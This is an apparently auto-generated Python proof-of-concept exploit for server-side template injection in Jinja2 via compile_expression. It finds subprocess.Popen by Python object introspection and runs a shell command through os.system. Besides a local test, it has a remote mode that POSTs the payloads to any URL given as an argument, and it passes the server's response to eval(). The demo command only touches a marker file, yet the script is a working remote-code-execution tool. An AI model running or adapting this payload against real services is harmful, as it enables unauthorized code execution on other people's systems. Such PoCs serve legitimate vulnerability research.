#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: ssti-015
# Sink: compile_expression
# Auto-generated — run with: python3 ssti_jinja2_expression_compile_expression.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Jinja2 SSTI via compile_expression (CVE-like).
This demonstrates that an attacker can achieve Remote Code Execution by
injecting a Jinja2 expression that escapes the sandbox and executes system commands.

Vulnerability: The compile_expression() method in Jinja2's Environment class
parses user-controlled input as a Jinja2 expression without any sandboxing.
An attacker can use Python's built-in object introspection to access
subprocess.Popen and execute arbitrary commands.

Usage:
    python3 exploit.py [target_url]

    If no URL is provided, it runs a local test using the vulnerable library.
"""

import sys
import os
import subprocess
import tempfile
import json

# Try to import requests for remote exploitation, fall back to local test
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("[!] requests not installed, will only run local test")


def local_exploit():
    """
    Test the vulnerability locally by directly calling compile_expression.
    This simulates what would happen if an attacker controlled the input.
    """
    print("[*] Running local exploit test...")
    
    # Import Jinja2 - adjust path if needed
    sys.path.insert(0, '/tmp/bounty_test/Jinja2-3.1.3/src')
    try:
        from jinja2 import Environment
    except ImportError:
        print("[!] Could not import Jinja2 from /tmp/bounty_test/Jinja2-3.1.3/src")
        print("[*] Trying system Jinja2 instead...")
        from jinja2 import Environment
    
    # Create a marker file to prove RCE
    marker = tempfile.mktemp(suffix='_poc_success.txt')
    
    # Classic Jinja2 SSTI payload to execute a command
    # This uses __class__.__mro__ to access object base classes,
    # then __subclasses__() to find subprocess.Popen
    payload = (
        "''.__class__.__mro__[1].__subclasses__()"
        "[X].__init__.__globals__['__builtins__']['__import__']('os')"
        ".system('touch {}')".format(marker)
    )
    
    # We need to find the index of subprocess.Popen in __subclasses__()
    # First, let's find it dynamically
    find_popen = (
        "''.__class__.__mro__[1].__subclasses__()"
    )
    
    env = Environment()
    
    # Step 1: Find the index of Popen
    print("[*] Finding subprocess.Popen index...")
    try:
        expr = env.compile_expression(find_popen)
        classes = expr()
        popen_index = None
        for i, cls in enumerate(classes):
            if 'Popen' in str(cls):
                popen_index = i
                break
        
        if popen_index is None:
            print("[!] Could not find Popen in subclasses")
            return False
        
        print(f"[+] Found Popen at index {popen_index}")
        
        # Step 2: Execute the command
        payload = (
            "''.__class__.__mro__[1].__subclasses__()"
            f"[{popen_index}].__init__.__globals__['__builtins__']['__import__']('os')"
            f".system('touch {marker}')"
        )
        
        print(f"[*] Executing payload: touch {marker}")
        expr = env.compile_expression(payload)
        result = expr()
        
        # Check if the file was created
        if os.path.exists(marker):
            print(f"[+] SUCCESS! Marker file created: {marker}")
            os.remove(marker)
            print("[+] Cleaned up marker file")
            return True
        else:
            print("[!] Marker file was not created")
            return False
            
    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        import traceback
        traceback.print_exc()
        return False


def remote_exploit(target_url):
    """
    Attempt to exploit a remote service that uses compile_expression
    with user-controlled input.
    
    This assumes the endpoint accepts a JSON payload like:
    {"expression": "user_input"}
    and returns the result.
    """
    if not HAS_REQUESTS:
        print("[!] requests library required for remote exploitation")
        return False
    
    print(f"[*] Attempting remote exploit against {target_url}")
    
    # Benign payload that creates a file to prove RCE
    # In a real engagement, you'd use something less destructive
    marker = "/tmp/poc_success.txt"
    
    # Find Popen index first (this may vary by Python version)
    find_popen = "''.__class__.__mro__[1].__subclasses__()"
    
    try:
        # Step 1: Get the list of subclasses to find Popen
        print("[*] Step 1: Finding Popen index...")
        resp = requests.post(
            target_url,
            json={"expression": find_popen},
            timeout=10
        )
        
        if resp.status_code != 200:
            print(f"[!] Request failed with status {resp.status_code}")
            print(f"[!] Response: {resp.text[:500]}")
            return False
        
        # Parse the response to find Popen index
        # This depends on how the server returns the result
        try:
            classes = resp.json() if resp.headers.get('content-type') == 'application/json' else eval(resp.text)
        except:
            classes = eval(resp.text)
        
        popen_index = None
        for i, cls in enumerate(classes):
            if 'Popen' in str(cls):
                popen_index = i
                break
        
        if popen_index is None:
            print("[!] Could not find Popen in subclasses")
            print("[!] Response snippet:", str(classes)[:200])
            return False
        
        print(f"[+] Found Popen at index {popen_index}")
        
        # Step 2: Execute the command
        payload = (
            "''.__class__.__mro__[1].__subclasses__()"
            f"[{popen_index}].__init__.__globals__['__builtins__']['__import__']('os')"
            f".system('touch {marker}')"
        )
        
        print(f"[*] Step 2: Executing command...")
        resp = requests.post(
            target_url,
            json={"expression": payload},
            timeout=10
        )
        
        print(f"[+] Command executed (exit code in response)")
        print(f"[*] Check if {marker} was created on the server")
        return True
        
    except requests.exceptions.ConnectionError:
        print(f"[!] Connection failed to {target_url}")
        return False
    except requests.exceptions.Timeout:
        print(f"[!] Request timed out")
        return False
    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        import traceback
        traceback.print_exc()
        return False


def main():
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if not target.startswith('http'):
            target = 'http://' + target
        success = remote_exploit(target)
    else:
        print("[*] No target URL provided, running local test")
        print("[*] Usage: python3 exploit.py [target_url]")
        print()
        success = local_exploit()
    
    if success:
        print("\n[+] EXPLOIT SUCCEEDED - The vulnerability is confirmed exploitable")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed - either the target is not vulnerable or there's an issue")
        sys.exit(1)


if __name__ == "__main__":
    main()
